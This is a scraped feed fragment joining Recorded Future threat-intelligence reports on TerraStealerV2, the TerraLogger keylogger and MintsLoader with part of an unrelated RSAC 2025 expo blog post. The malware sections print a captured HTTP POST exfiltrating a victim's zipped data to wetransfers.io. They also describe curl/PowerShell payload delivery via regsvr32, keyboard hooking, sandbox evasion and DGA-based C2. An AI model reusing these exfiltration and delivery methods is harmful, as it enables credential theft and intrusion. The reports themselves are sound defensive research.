%LOCALAPPDATA%\\Packages\\Bay0NsQIzx, and a Telegram message is sent indicating the number of crypto wallets found. The contents of %LOCALAPPDATA%\\Packages\\Bay0NsQIzx are subsequently compressed into an archive named output.zip, located in the same directory. The archive is then exfiltrated to the Telegram bot and a secondary C2 endpoint hosted at wetransfers[.]io/uplo.php, as shown in Figure 7. The domain wetransfers[.]io was registered on February 18, 2025, via NameCheap, Inc., and is currently hosted behind Cloudflare infrastructure.\nPOST /uplo.php HTTP/1.1\nHost: wetransfers.io\nAccept: */*\nContent-Length: 11252\nContent-Type: multipart/form-data; boundary=------------------------rUxSmqCNbtGx4auL8M41nl\n--------------------------rUxSmqCNbtGx4auL8M41nl\nContent-Disposition: form-data; name=\"zipFile\"; filename=\"output.zip\"\nContent-Type: application/octet-stream\nPK........3.dZ...')...).......p.txt2025-03-04 21:33:38 - Total Browsers  2\nPK..?.......3.dZ...')...).....................p.txtPK..........3...L.....\n--------------------------rUxSmqCNbtGx4auL8M41nl\nContent-Disposition: form-data; name=\"pcname\"\nUUHJKMQK\n--------------------------rUxSmqCNbtGx4auL8M41nl\nContent-Disposition: form-data; name=\"username\"\nAdmin\n--------------------------rUxSmqCNbtGx4auL8M41nl\nContent-Disposition: form-data; name=\"totalwallets\"\n0\n--------------------------rUxSmqCNbtGx4auL8M41nl\nContent-Disposition: form-data; name=\"ip\"\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n   <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n   <meta http-equiv=\"content-style-type\" content=\"text/css\" />\n   <meta http-equiv=\"content-script-type\" content=\"text/javascript\" />\n   <meta http-equiv=\"content-language\" content=\"en\" />\n   <meta http-equiv=\"pragma\" content=\"no-cache\" />\n   <meta http-equiv=\"cache-control\" content=\"no-cache\" />\n   <meta name=\"description\" content=\"Get my IP Address\" />\n   <meta name=\"keywords\" content=\"ip address ifconfig ifconfig.me\" />\n\nFigure 7: TerraStealerV2 exfiltrating data to wetransfers[.]io. (Source: Recorded Future)\nDistribution\nInsikt Group has identified multiple delivery mechanisms employed in the distribution of TerraStealerV2, including executable files (EXEs), dynamic-link libraries (DLLs), Windows Installer packages (MSI), and shortcut (LNK) files. Across all observed cases, the TerraStealerV2 OCX payload was retrieved from the URL wetransfers[.]io/v.php — a resource hosted on the same domain leveraged for data exfiltration — using either curl or PowerShell, and subsequently executed via regsvr32.exe (see Figure 8).\nFigure 8: TerraStealerV2 distribution samples attack chain (Source: Recorded Future)\nTable 1 lists distribution samples, including their filenames, compilation timestamps, and the corresponding TerraStealerV2 payloads Golden Chickens have been observed deploying. One LNK file (SHA-256: 9aed0eda60e4e1138be5d6d8d0280343a3cf6b30d39a704b2d00503261adbe2a) appears to overlap with the activity cluster tracked as ClickFix. In this case, the LNK file dropped a payload masquerading as an MP4 file, which was executed via mshta.exe — a technique consistent with previously observed tactics in ClickFix campaigns.\nTerraStealerV2 Distribution\nFilename\nCompilation/First Submitted Timestamp\nTerraStealerV2 Loaded\n9aed0eda60e4e1138be5d6d8d0280343a3cf6b30d39a704b2d00503261adbe2a\nolala.lnk\n2025-01-03 03:32 UTC\n828eee78537e49b46e34a754306ccf67f6281b77e5caeaf53132a32b6b708e5c\n58b324d37bbf6d706b0fe5dbb8bca92d9628a9c394ca81121cea1690a16a3afa\n1.exe\n2025-01-29 05:41:34 UTC\n151a83f0b54d23d84fb152ee34c4344801da937d03cc354ab8a149d64b8247b3\n63fb3ed0aba87917847ad256c4e89f7b250adc6e2eac74023bb52e091ab0ef97\nBundleInstaller.dll\n2025-02-18 22:20:54 UTC\n151a83f0b54d23d84fb152ee34c4344801da937d03cc354ab8a149d64b8247b3\n4b6fa036aceb1e2149848ff46c4e1a6a89eee3b7d59769634ce9127fdaa96234\nsetup.msi\n2025-02-19 12:44:27 UTC\n151a83f0b54d23d84fb152ee34c4344801da937d03cc354ab8a149d64b8247b3\n14d9d56bc4c17a971a9d69b41a4663ab7eb2ca5b52d860f9613823101f072c31\nsetup.msi\n2025-02-19 13:22:37 UTC\nd6246e4f0425b38a26298b7840729e677c4d16f084a005c46fad4904637e726a\n1ed9368d5ac629fa2e7e81516e4520f02eb970d010d3087e902cd4f2e35b1752\nsetup.msi\n2025-02-19 19:26:03 UTC\n151a83f0b54d23d84fb152ee34c4344801da937d03cc354ab8a149d64b8247b3\n766690a09ec97e414e732d16b99b19389a91835abc15684cc0f1aba2ca93cf98\nhyhyhy.lnk\n2025-02-28, 07:40 UTC\n828eee78537e49b46e34a754306ccf67f6281b77e5caeaf53132a32b6b708e5c\n313203cb71acd29e6cc542bf57f0e90ce9e9456e2483a20418c8f17b7afe0b57\n1.exe\n2025-03-03 13:51:40 UTC\na2f7d83ddbe0aeba5f5113a8adf2011dc1a7393fa4fe123e74a17dbc2a702b13\nde6ed44d21e5bc9bc5c1c51f33760a5d96378308d02c2c81ef2d75e7a201fb63\n1.exe\n2025-03-03 13:51:40 UTC\na2f7d83ddbe0aeba5f5113a8adf2011dc1a7393fa4fe123e74a17dbc2a702b13\nTable 1: Samples used to distribute TerraStealerV2 (Source: Recorded Future)\nTerraLogger\nInsikt Group identified a new keylogger associated with Golden Chickens, which was uploaded to Recorded Future Malware Intelligence on January 13, 2025. Insikt Group tracks this family as TerraLogger and has identified five distinct samples. Four samples operate as intended and contain an identical PDB string, shown in Figure 9 below. The remaining sample does not include this PDB string and instead uses the same PDB path as TerraStealerV2 (see Figure 3 above). This outlier appears to be a developer test, using the same string-encoding method as TerraStealerV2; however, it fails during execution due to a crash while initializing keylogger-related strings, which prevents the malware from reaching its primary entry point.\nC:\\Users\\PC\\Downloads\\Projector\\Projector\\x64\\Release\\Projector.pdb\nFigure 9: TerraLogger PDB string (Source: Recorded Future)\nTerraLogger is typically delivered as an OCX file and employs the same initial execution checks as TerraStealerV2. It is intended to be executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, it first checks that the provided file has a .ocx extension and that the filename ends with a hard-coded character or digit (such as 0.ocx). It then verifies that it is being run by regsvr32.exe before proceeding. If the initial execution checks pass, TerraLogger opens a file handle to log keystrokes.\nInsikt Group identified multiple file paths across the five identified samples, with logs written to files such as a.txt, f.txt, op.txt, or save.txt located in the C:\\ProgramData folder. The malware implements its keylogger using a commonly observed technique by installing a WH_KEYBOARD_LL hook using SetWindowsHookExA, registering the fn callback function (shown in Figure 10) to intercept and process message events, enabling keyboard activity to be captured.\nFigure 10: Keylogger callback function (Source: Recorded Future)\nKeystrokes are written to the open log file within the mw_log_key function. This function first retrieves the title of the current foreground window, then appends a line separator followed by the intercepted keystrokes. It contains logic to handle special characters, such as semicolons, brackets, and quotes, and checks the state of the Shift key to determine the correct character to log. If a keycode does not match any known special keys, it is written in <KEY-[keycode]> format. An example of a resulting log file is shown in Figure 11.\nFigure 11: Keylogger log file example (Source: Recorded Future)\nTable 2 lists the five TerraLogger keylogger samples identified and summarizes the differences across versions. Compilation timestamps indicate that the first version was built on January 13, 2025, and that the most recent sample was compiled on April 1, 2025. These samples reflect minor, incremental updates, suggesting active development. Notable changes include modifications to the file path used for storing keystroke logs and a shift in how special keys are represented — from angle-bracketed, uppercase tokens (for example, , ) to pipe-delimited, lowercase abbreviations (for example, |bck|, |sft|).\nSample\nCompile Time\nSave Path\nSpecial Keys Capitalized\nSpecial Keys Abbreviated\n067421234fdd631628569bd86b6757ce4c78139c3609493c92db7b096b0c22f4\n2025-01-13 14:16:35 UTC\nc:\\programdata\\save.txt\n✔\n            \n\n          \n315e0c9f0dbfa662327c57a570bcafc79b1ba816deb9647fd8da5dc6dc1e8808\n2025-02-06 09:00:22 UTC\nc:\\programdata\\save.txt\n✔\n            \n\n          \nf06097b6f4bf86ad00c8f7115d538823a73e531b0f06b66f63f9c70e47f4ea98\n2025-03-11 14:39:27 UTC\nc:\\programdata\\op.txt\n✔\n            \n\n          \n852879a9832cd13cbc9510503abf9b0906bb5e08e5ffae74381aaca3c502d826\n2025-03-11 14:42:11 UTC\nc:\\programdata\\a.txt\n\n            \n✔\n          \n81117772d2b1997f4e280c3add3b56c128444ba05ec4eaaf2293ef8ff1c76257\n2025-04-01 15:54:57 UTC\nc:\\programdata\\f.txt\n\n            \n✔\n          \nTable 2: Comparison of standalone TerraLogger sample changes (Source: Recorded Future)\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1c6dea53d50bc336cef25048a0584c4b9d39a02e8.png?width=1200&format=pjpg&optimize=medium"},"content":"Insikt Group reveals two emerging malware strains—TerraStealerV2 and TerraLogger—linked to Golden Chickens, a threat actor behind credential theft and keylogging MaaS platforms.

Both animal-themed booths proved that in the battle for attendee attention, sometimes the most effective strategy is simply offering a moment of joy amid the cybersecurity intensity.\nRecorded Future’s Branding and Malware Intelligence on the Expo Floor\nA highlight for me was seeing Recorded Future’s new brand on display front and center on the show floor with the new electric blue and bold red accent colors. The boldness of the brand stood out amid a sea of sameness – dark displays, matrix-like code animations, and ubiquitous hooded figures – and captured what Recorded Future is all about. When organizations are facing increasingly sophisticated threats, they need a bold partner that stands out from the others with clarity, focus, and actionable insights.\nCoupling the new brand with the launch of Recorded Future’s new Malware Intelligence offerings made the booth one of the must see stops as attendees made their way around the floor. Attendees were able to see demos of the product and see for themselves how Malware Intelligence helped achieve the following outcomes:\nReduction in time spent analyzing malware samples\nAutomated malware detection at scale\nShift from reactive to proactive and spot emerging threats before they become a problem\nThe average team saves 11 hours weekly on threat analysis, hunting, and reporting efforts with Recorded Future Malware Intelligence (Source)\nThe team also discussed the new capabilities available with Malware Intelligence including malware hunting, Auto YARA Rules, and malware Alerts.\nDon’t worry if you were unable to stop by the booth, you can find more information on Malware Intelligence on the new Recorded Future website at www.recordedfuture.com/malware-intelligence.\nLooking Ahead\nAs I left the expo floor, it was clear that the cybersecurity industry continues its march toward more integrated, intelligence-driven approaches. The vendors that stood out weren't those with the flashiest booths or the most aggressive marketing—they were those offering genuine advancements in connecting disparate security data points into coherent, actionable intelligence. As the conference comes to a close, it was great to hear all the new ideas, see the keynotes, and network with other security practitioners. I look forward to RSAC 2026 and I am curious what animals might be on the show floor next year.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_16ec64e0f2dd39264b14e75f27729cefc836739af.png?width=1200&format=pjpg&optimize=medium"},"content":"There was much to see at RSAC 2025.

The loader commonly deploys second-stage payloads such as GhostWeaver, StealC, and a modified BOINC (Berkeley Open Infrastructure for Network Computing) client. MintsLoader operates through a multi-stage infection chain involving obfuscated JavaScript and PowerShell scripts. The malware employs sandbox and virtual machine evasion techniques, a domain generation algorithm (DGA), and HTTP-based command-and-control (C2) communications.</p>\n        <p>MintsLoader has been observed being used by various threat groups; however, operators of TAG-124 (also known as LandUpdate808) have used it extensively. The loader is deployed through multiple infection vectors, including phishing emails targeting the industrial, legal, and energy sectors (TAG-124); compromised websites impersonating browser update prompts (SocGholish); and invoice-themed lures distributed via Italy’s PEC certified email system.</p>\n        <p>MintsLoader’s use of obfuscation complicates static detections such as YARA rules, its use of DGA-based C2 infrastructure makes it difficult to maintain up-to-date watchlists or blocklists, and its anti-analysis techniques complicate host-based detections that rely on sandboxes or virtualization. But Recorded Future’s Malware Intelligence Hunting identifies new MintsLoader samples and associated C2 domains and provides an up-to-date list for blocklists or threat hunting.</p>\n        <p>MintsLoader’s persistent use of obfuscation, sandbox evasion, and adaptive infrastructure likely ensures its continued presence within the malware ecosystem, likely leading to increased use by additional threat actors. The malware’s role as a versatile delivery mechanism reflects the increasing professionalization and specialization within the cybercriminal community. While this growing sophistication benefits threat actors by enabling more resilient and efficient operations, it may simultaneously provide opportunities for defenders to identify and disrupt malicious activity more effectively and at scale.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>MintsLoader's second-stage PowerShell script uses sandbox and virtual environment evasion techniques, reducing its susceptibility to automated analysis and increasing its likelihood of bypassing dynamic detection tools.</li>\n          <li>MintsLoader's use of a DGA to generate daily C2 domains based on the system date complicates infrastructure monitoring activity and domain/IP-based detections.</li>\n          <li>Recorded Future’s Malware Intelligence Hunting provides up-to-date C2 domains and other artifacts related to MintsLoader that would otherwise be hard to track due to its dynamic infrastructure.</li>\n          <li>Insikt Group shows that GhostWeaver is the primary payload deployed by MintsLoader across observed campaigns.</li>\n          <li>GhostWeaver’s self-signed X.509 certificates are similar to those of AsyncRAT and variants of AsyncRAT, leading to initial false associations with other malware families such as AsyncRAT.</li>\n        </ul>\n        <h2>Background</h2>\n        <p><a href=\"https://github.com/cert-orangecyberdefense/mintsloader\">Orange Cyberdefense</a> first detected MintsLoader in widespread distribution campaigns between July and October 2024.

The name “MintsLoader” is derived from its distinctive use of the URL parameter s=mints[NUMBER] (for example, s=mints11). MintsLoader is typically <a href=\"https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983\">observed</a> in campaigns delivering secondary payloads such as GhostWeaver, StealC, and the Berkeley Open Infrastructure for Network Computing (BOINC) client.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-001.png\" src=\"https://www.recordedfuture.com/media_15e5c0f11a9a5506e5502bc8d9f938d5b5b74d0d5.png?width=750&amp;format=png&amp;optimize=medium\" width=\"682\" height=\"386\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>MintsLoader profile (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>While MintsLoader is believed to be used by multiple threat actors, TAG-124 (also known as LandUpdate808) infections have frequently been observed deploying MintsLoader. Additionally, threat actors using SocGholish were early adopters of MintsLoader, resulting in the initial assessment of MintsLoader campaigns as being exclusively associated with SocGholish. For example, in February 2024, Palo Alto’s Unit42 <a href=\"https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt\">released</a> indicators linked to SocGholish (Figure 2); however, Insikt Group's analysis indicates that the URLs identified as delivering AsyncRAT also align with known MintsLoader URL patterns.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-002.png\" src=\"https://www.recordedfuture.com/media_11a8a3e614c10175af8927461e140274733c2684e.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1180\" height=\"170\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2:</em></strong> <em>Palo Alto SocGholish infection IoCs (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Similarly, in July 2024, Huntress Labs <a href=\"https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\">reported</a> a SocGholish infection delivering a BOINC client.

Phishing emails (targeting the energy, oil and gas, and legal sectors in the US and Europe​) carried either a malicious JavaScript attachment or a link to a fake “Click to verify” web page​. <strong>Figure 4</strong> shows examples of ClickFix pages.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-004.png\" src=\"https://www.recordedfuture.com/media_18bb150fb50ca1b1d1486c310c9c1658aac52a482.png?width=750&amp;format=png&amp;optimize=medium\" width=\"875\" height=\"552\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>Examples of ClickFix pages (Source:</em> <em><a href=\"https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf\">https://www.hhs.gov/</a>)</em></div>\n          </div>\n        </div>\n        <p>In both cases, the result was the execution of MintsLoader’s PowerShell-based second stage on the victim’s machine. This loader pulled down the final payloads, notably the StealC infostealer and a modified BOINC client build. The <a href=\"https://thehackernews.com/2025/01/mintsloader-delivers-stealc-malware-and.html\">campaign</a> leveraged fake CAPTCHA verification pages (ClickFix/KongTuke lures) to trick users into executing a copied PowerShell command, which downloaded and ran MintsLoader (<strong>Figure 5</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-005.png\" src=\"https://www.recordedfuture.com/media_10a1d478ed280efd972c02cd62ba8e68a90b912d5.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1528\" height=\"734\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 5:</em></strong> <em>MintsLoader ClickFix infection chain (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Other <a href=\"https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery\">infection</a> chains in this campaign delivered MintsLoader via a downloaded ‘Fattura########.js’ file (Italian for “invoice”) that victims opened, leading to the same PowerShell loader execution​. Researchers at eSentire’s Threat Response Unit reported this campaign and noted the threat actors’ focus on industrial and professional services targets across North America and Europe.</p>\n        <h3>SocGholish “FakeUpdates” Campaigns</h3>\n        <p>Multiple reports indicate (<a href=\"https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983\">1</a>, <a href=\"https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software#:~:text=Beginning%20on%20July%204%2C%202024%2C,such%20as%20AsyncRAT%20or%20NetSupport\">2</a>) that the SocGholish (FakeUpdates) threat actors incorporated MintsLoader into their operations. Starting around July 2024, SocGholish infections from compromised websites showed infection chains installing the BOINC-distributed computing client via MintsLoader.</p>\n        <p>In this drive-by campaign, shown in <strong>Figure 6</strong>, victims browsing legitimate but compromised sites encountered fake browser update prompts (often originating from an update.js script). If run, the malicious JavaScript fetched an obfuscated MintsLoader payload, kicking off a multi-step PowerShell sequence.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-006.png\" src=\"https://www.recordedfuture.com/media_1a3783fcf21be4af054ce20d14ff1627bbb486599.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"662\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 6:</em></strong> <em>MintsLoader fake updates example (Source:</em> <em><a href=\"https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983\">TRAC Labs</a>)</em></div>\n          </div>\n        </div>\n        <p>Huntress Labs documented two parallel outcomes: one branch resulted in a fileless AsyncRAT running in memory, while the other led to a stealth BOINC installation under attacker control. The BOINC deployment was notably modified and configured to connect to a malicious C2 rather than the standard BOINC server.</p>\n        <p>In some cases, the GhostWeaver PowerShell <a href=\"https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983\">backdoor</a> (tracked by Mandiant as UNC4108) was also delivered via MintsLoader, providing attackers with a persistent foothold and a platform to load additional plugins.</p>\n        <h2>Invoice Phishing in Europe</h2>\n        <p>Another MintsLoader campaign in late 2024 <a href=\"https://www.spamhaus.org/resource-hub/cybercrime/pec-invoice-scam/#the-pec-%22invoice-scam%22\">targeted</a> European organizations via invoice-themed phishing emails​, an example of which is shown in Figure 7. Spam messages leveraged Italy’s PEC (certified email) system to add legitimacy and lured recipients into opening attached JavaScript files masquerading as invoices. The Spamhaus research team dubbed this the “PEC invoice scam” and highlighted how the attackers abused trusted email channels to bypass security checks. This campaign was noted for “stealing time, money, and trust from businesses.”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-007.png\" src=\"https://www.recordedfuture.com/media_18753b510879451b3df2537130ce951822f785e94.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1449\" height=\"524\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 7:</em></strong> <em>PEC phishing email (Source:</em> <em><a href=\"https://www.spamhaus.org/resource-hub/cybercrime/pec-invoice-scam/#not-the-same-campaign-again\">Spamhaus</a>)</em></div>\n          </div>\n        </div>\n        <h2>Technical Analysis</h2>\n        <p>MintsLoader uses a multi-stage execution chain involving JavaScript and PowerShell, with each stage employing obfuscation to hinder analysis. Although MintsLoader functions solely as a loader without supplementary capabilities, its primary strengths lie in its sandbox and virtual machine evasion techniques and a DGA implementation that derives the C2 domain based on the day it is run. These features significantly complicate static analysis and host-based detection. Despite this, its C2 communications occur over HTTP, which provides a reliable vector for detecting and identifying new samples. <strong>Figure 8</strong> provides the high-level capabilities of MintsLoader.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-008.png\" src=\"https://www.recordedfuture.com/media_18f2478445bbaae69670db7009bbffd91f4ad639a.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1550\" height=\"804\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 8:</em></strong> <em>MintsLoader high-level capabilities (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>This analysis of MintsLoader includes details on the first- and second-stage payloads and MintsLoader infrastructure.</p>\n        <h2>MintsLoader Attack Chain</h2>\n        <p>MintsLoader is commonly delivered via phishing emails containing links to KongTuke or ClickFix pages. When executed, these pages retrieve and run the first stage of JavaScript. The JavaScript is heavily obfuscated, and execution leads to running a PowerShell command to download and execute the second stage of MintsLoader, as shown in <strong>Figure 9</strong>.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-009.png\" src=\"https://www.recordedfuture.com/media_1b472e711735276bf62d243e802c8d46fc3259188.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"416\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 9:</em></strong> <em>First stage of MintsLoader infection (Source:</em> <em><a href=\"https://tria.ge/250303-rmy8lsznz9/behavioral2\">Recorded Future Malware Intelligence</a>)</em></div>\n          </div>\n        </div>\n        <p>This second stage conducts environment checks to determine whether it is running in a sandbox or virtualized setting. Next, the script uses a DGA to produce the next C2 domain. MintsLoader then attempts to contact the generated domain to download the final payload, such as GhostWeaver, StealC, or the BOINC client. Figure 10 shows a high-level overview of this attack chain.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"malware-hunting-010.png\" src=\"https://www.recordedfuture.com/media_107a9024134212925deeb8f58ce5c88152f479e89.png?width=750&amp;format=png&amp;optimize=medium\" width=\"966\" height=\"546\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 10:</em></strong> <em>Common MintsLoader infection chain (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h2>Stage One: JavaScript</h2>\n        <p>The initial stage of MintsLoader consists of a JavaScript file that executes a PowerShell command to retrieve the second stage.

The logical expressions may not provide apparent results on initial inspection. For example, if the first deobfuscated system check, shown below in <strong>Figure 18</strong>, were to run on a virtual machine, the $isVirtualMachine variable would be equal to $true.

GhostWeaver and AsyncRAT share certain characteristics within their self-signed X.509 certificates, such as identical expiration dates and serial number lengths; however, these similarities may simply reflect common certificate-generation methods rather than meaningful operational overlap.</p>\n        <h2>MintsLoader Infrastructure</h2>\n        <p>Insikt Group initially found MintsLoader C2 servers hosted solely on BLNWX but later observed its growing use of other ISPs such as Stark Industries Solutions Ltd (AS44477), GWY IT Pty Ltd.​ (AS199959), or SCALAXY-AS (58061), among others. MintsLoader C2 IP addresses announced via SCALAXY-AS are operated by hosting providers 3NT Solutions LLP and IROKO Networks Corporation, both of which are a part of the Russian-language bulletproof hosting provider Inferno Solutions (inferno[.]name). The switch to SCALAXY-AS and Stark Industries Solutions suggests that MintsLoader operators have shifted from relying on anonymous virtual private server (VPS) providers to more traditional bulletproof hosters, likely in an effort to harden their infrastructure against takedown attempts and enhance operational stability.</p>\n        <p>Over the past several months, Insikt Group has identified a range of suspected additional campaign IDs and payloads (<strong>Table 2</strong>).

","content:encodedSnippet":"Executive Summary\nMintsLoader, a malicious loader, was first observed in multiple phishing and drive-by download campaigns as early as 2024. The loader commonly deploys second-stage payloads such as GhostWeaver, StealC, and a modified BOINC (Berkeley Open Infrastructure for Network Computing) client. MintsLoader operates through a multi-stage infection chain involving obfuscated JavaScript and PowerShell scripts. The malware employs sandbox and virtual machine evasion techniques, a domain generation algorithm (DGA), and HTTP-based command-and-control (C2) communications.\nMintsLoader has been observed being used by various threat groups; however, operators of TAG-124 (also known as LandUpdate808) have used it extensively. The loader is deployed through multiple infection vectors, including phishing emails targeting the industrial, legal, and energy sectors (TAG-124); compromised websites impersonating browser update prompts (SocGholish); and invoice-themed lures distributed via Italy’s PEC certified email system.\nMintsLoader’s use of obfuscation complicates static detections such as YARA rules, its use of DGA-based C2 infrastructure makes it difficult to maintain up-to-date watchlists or blocklists, and its anti-analysis techniques complicate host-based detections that rely on sandboxes or virtualization. But Recorded Future’s Malware Intelligence Hunting identifies new MintsLoader samples and associated C2 domains and provides an up-to-date list for blocklists or threat hunting.\nMintsLoader’s persistent use of obfuscation, sandbox evasion, and adaptive infrastructure likely ensures its continued presence within the malware ecosystem, likely leading to increased use by additional threat actors. The malware’s role as a versatile delivery mechanism reflects the increasing professionalization and specialization within the cybercriminal community. While this growing sophistication benefits threat actors by enabling more resilient and efficient operations, it may simultaneously provide opportunities for defenders to identify and disrupt malicious activity more effectively and at scale.\nKey Findings\nMintsLoader's second-stage PowerShell script uses sandbox and virtual environment evasion techniques, reducing its susceptibility to automated analysis and increasing its likelihood of bypassing dynamic detection tools.\nMintsLoader's use of a DGA to generate daily C2 domains based on the system date complicates infrastructure monitoring activity and domain/IP-based detections.\nRecorded Future’s Malware Intelligence Hunting provides up-to-date C2 domains and other artifacts related to MintsLoader that would otherwise be hard to track due to its dynamic infrastructure.\nInsikt Group shows that GhostWeaver is the primary payload deployed by MintsLoader across observed campaigns.\nGhostWeaver’s self-signed X.509 certificates are similar to those of AsyncRAT and variants of AsyncRAT, leading to initial false associations with other malware families such as AsyncRAT.\nBackground\nOrange Cyberdefense first detected MintsLoader in widespread distribution campaigns between July and October 2024. Insikt Group identified earlier campaigns in February 2024, based on Palo Alto’s Unit42 analysis of a SocGholish infection.\nThe loader consists of JavaScript (stage one) and PowerShell (stage two) scripts retrieved from multiple DGA-based domains. The name “MintsLoader” is derived from its distinctive use of the URL parameter s=mints[NUMBER] (for example, s=mints11). MintsLoader is typically observed in campaigns delivering secondary payloads such as GhostWeaver, StealC, and the Berkeley Open Infrastructure for Network Computing (BOINC) client.\nFigure 1: MintsLoader profile (Source: Recorded Future)\nWhile MintsLoader is believed to be used by multiple threat actors, TAG-124 (also known as LandUpdate808) infections have frequently been observed deploying MintsLoader. Additionally, threat actors using SocGholish were early adopters of MintsLoader, resulting in the initial assessment of MintsLoader campaigns as being exclusively associated with SocGholish. For example, in February 2024, Palo Alto’s Unit42 released indicators linked to SocGholish (Figure 2); however, Insikt Group's analysis indicates that the URLs identified as delivering AsyncRAT also align with known MintsLoader URL patterns.\nFigure 2: Palo Alto SocGholish infection IoCs (Source: Recorded Future)\nSimilarly, in July 2024, Huntress Labs reported a SocGholish infection delivering a BOINC client. Notably, the URL used to download the BOINC matches known MintsLoader URL patterns. Figure 3 shows a high-level overview of the threat actors that use MintsLoader.\nFigure 3: Threat actors' use of MintsLoader (Source: Recorded Future)\nBelow are recently reported campaigns involving MintsLoader.\nMintsLoader and Kongtuke/ClickFix pages\nIn early 2025, security analysts observed a phishing campaign delivering MintsLoader as a first-stage loader. Phishing emails (targeting the energy, oil and gas, and legal sectors in the US and Europe​) carried either a malicious JavaScript attachment or a link to a fake “Click to verify” web page​. Figure 4 shows examples of ClickFix pages.\nFigure 4: Examples of ClickFix pages (Source: https://www.hhs.gov/)\nIn both cases, the result was the execution of MintsLoader’s PowerShell-based second stage on the victim’s machine. This loader pulled down the final payloads, notably the StealC infostealer and a modified BOINC client build. The campaign leveraged fake CAPTCHA verification pages (ClickFix/KongTuke lures) to trick users into executing a copied PowerShell command, which downloaded and ran MintsLoader (Figure 5).\nFigure 5: MintsLoader ClickFix infection chain (Source: Recorded Future)\nOther infection chains in this campaign delivered MintsLoader via a downloaded ‘Fattura########.js’ file (Italian for “invoice”) that victims opened, leading to the same PowerShell loader execution​. Researchers at eSentire’s Threat Response Unit reported this campaign and noted the threat actors’ focus on industrial and professional services targets across North America and Europe.\nSocGholish “FakeUpdates” Campaigns\nMultiple reports indicate (1, 2) that the SocGholish (FakeUpdates) threat actors incorporated MintsLoader into their operations. Starting around July 2024, SocGholish infections from compromised websites showed infection chains installing the BOINC-distributed computing client via MintsLoader.\nIn this drive-by campaign, shown in Figure 6, victims browsing legitimate but compromised sites encountered fake browser update prompts (often originating from an update.js script). If run, the malicious JavaScript fetched an obfuscated MintsLoader payload, kicking off a multi-step PowerShell sequence.\nFigure 6: MintsLoader fake updates example (Source: TRAC Labs)\nHuntress Labs documented two parallel outcomes: one branch resulted in a fileless AsyncRAT running in memory, while the other led to a stealth BOINC installation under attacker control. The BOINC deployment was notably modified and configured to connect to a malicious C2 rather than the standard BOINC server.\nIn some cases, the GhostWeaver PowerShell backdoor (tracked by Mandiant as UNC4108) was also delivered via MintsLoader, providing attackers with a persistent foothold and a platform to load additional plugins.\nInvoice Phishing in Europe\nAnother MintsLoader campaign in late 2024 targeted European organizations via invoice-themed phishing emails​, an example of which is shown in Figure 7. Spam messages leveraged Italy’s PEC (certified email) system to add legitimacy and lured recipients into opening attached JavaScript files masquerading as invoices. The Spamhaus research team dubbed this the “PEC invoice scam” and highlighted how the attackers abused trusted email channels to bypass security checks. This campaign was noted for “stealing time, money, and trust from businesses.”\nFigure 7: PEC phishing email (Source: Spamhaus)\nTechnical Analysis\nMintsLoader uses a multi-stage execution chain involving JavaScript and PowerShell, with each stage employing obfuscation to hinder analysis. Although MintsLoader functions solely as a loader without supplementary capabilities, its primary strengths lie in its sandbox and virtual machine evasion techniques and a DGA implementation that derives the C2 domain based on the day it is run. These features significantly complicate static analysis and host-based detection. Despite this, its C2 communications occur over HTTP, which provides a reliable vector for detecting and identifying new samples. Figure 8 provides the high-level capabilities of MintsLoader.\nFigure 8: MintsLoader high-level capabilities (Source: Recorded Future)\nThis analysis of MintsLoader 